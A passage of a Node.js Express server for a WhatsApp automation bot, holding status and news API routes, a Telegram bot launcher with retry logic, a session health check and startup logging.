    const role = getUserRole(username);
    const status = db.createStatus({
      id: "st_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8),
      username, displayName: username, role, type,
      text: type === "text" ? String(text).trim().slice(0, 180) : null,
      bg: type === "text" ? (bg || "linear-gradient(150deg,#6FC4F5,#1B72B0)") : null,
      src: type === "image" ? src : null,
      videoData: type === "video" ? videoData : null,
      thumb: type === "video" ? (thumb || null) : null,
      caption: (caption || "").toString().slice(0, 140),
      ts: Date.now(),
    });

    broadcastStatusEvent({ type: "status_new", statusId: status.id, username });
    res.json({ success: true, status });
  } catch (e) {
    console.error("[STATUS] create error:", e);
    res.json({ success: false, error: e.message });
  }
});

app.post("/api/status/delete", requireAuth, (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    const { statusId } = req.body || {};
    if (!statusId) return res.json({ success: false, error: "statusId required." });

    const result = db.deleteStatus(statusId, username, isOwner(username));
    if (!result.ok) return res.json({ success: false, error: result.error });

    broadcastStatusEvent({ type: "status_delete", statusId });
    res.json({ success: true, message: "Status dihapus." });
  } catch (e) {
    res.json({ success: false, error: e.message });
  }
});

app.get("/api/berita/list", requireAuth, (req, res) => {
  try {
    const list = loadBerita();
    const out = list.map((b) => ({
      id: b.id,
      tag: b.tag || "HOT",
      title: b.title || "",
      source: b.source || "X-For News",
      photo: b.photo || "",
      views: b.views || 0,
      ts: b.ts || Date.now(),
    }));
    res.json({ success: true, berita: out, total: out.length });
  } catch (e) {
    res.json({ success: false, berita: [], error: e.message });
  }
});

async function startTelegramBot(retry = 0) {
  const maxRetry = 5;
  try {
    await bot.telegram.deleteWebhook({ drop_pending_updates: true });

    if (retry > 0) {
      const waitMs = Math.min(3000 * retry, 15000);
      console.log(chalk.yellow(`⏳ Wait ${waitMs / 1000}s (${retry}/${maxRetry})...`));
      await sleep(waitMs);
    }

    await bot.launch({ dropPendingUpdates: true });
    console.log(chalk.green("✓ Telegram bot started"));
  } catch (err) {
    const msg = err?.message ? err.message : String(err);
    const is409 = /409|Conflict|terminated by other getUpdates/i.test(msg);
    if (is409 && retry < maxRetry) {
      console.log(chalk.red(`⚠ 409 Conflict. Retry ${retry + 1}/${maxRetry}...`));
      return startTelegramBot(retry + 1);
    }
    console.error(chalk.red("❌ Failed to start Telegram bot:"), msg);
  }
}

console.clear();
console.log(
  chalk.cyanBright(
    `\n─────────────────────────────────────\n` +
    `  WhatsApp Automation Bot\n` +
    `  Author    : @Lifzbarz\n` +
    `  Version   : 1.0.0\n` +
    `  Owner ID  : ${ownerIds}\n` +
    `─────────────────────────────────────\n`
  )
);

process.once("SIGINT", () => {
  console.log("SIGINT");
  try { bot.stop("SIGINT"); } catch {}
  process.exit(0);
});
process.once("SIGTERM", () => {
  console.log("SIGTERM");
  try { bot.stop("SIGTERM"); } catch {}
  process.exit(0);
});

setInterval(async () => {
  if (healthCheckRunning) {
    console.log("⚠️ Health check running, skipping...");
    return;
  }
  try {
    healthCheckRunning = true;
    const active = sessions.size;
    const userSessions = loadUserSessions();
    const total = Object.values(userSessions).reduce((acc, n) => acc + n.length, 0);
    console.log(`📊 Health: ${active}/${total} active`);

    if (total > 0 && active < total) {
      console.log("🔄 Restoring missing sessions...");
      simpleReloadSessions();
    } else if (active > 0) {
      console.log("✅ Sessions active");
    }
  } catch (err) {
    console.error("❌ Health error:", err.message);
  } finally {
    healthCheckRunning = false;
  }
}, HEALTH_CHECK_INTERVAL);

startTelegramBot();

setTimeout(() => {
  console.log("🔄 Auto-reload activated");
  forceReloadWithRetry();
}, AUTO_RELOAD_DELAY);

const APP_PORT = parseInt(PORT) || 3000;
app.listen(APP_PORT, () => {
  console.log(chalk.green(`✓ Server running on port ${APP_PORT}`));
  console.log(chalk.green(`✓ Database : database/data/`));
  console.log(chalk.cyan(`✓ Dashboard : http://localhost:${APP_PORT}/dashboard`));
  console.log(chalk.cyan(`✓ Login     : http://localhost:${APP_PORT}/login`));
  console.log(chalk.cyan(`✓ Execution : http://localhost:${APP_PORT}/execution-page`));
  console.log(chalk.cyan(`✓ Chat      : http://localhost:${APP_PORT}/chatglobal`));
  console.log(chalk.cyan(`✓ Berita    : http://localhost:${APP_PORT}/api/berita/list`));
});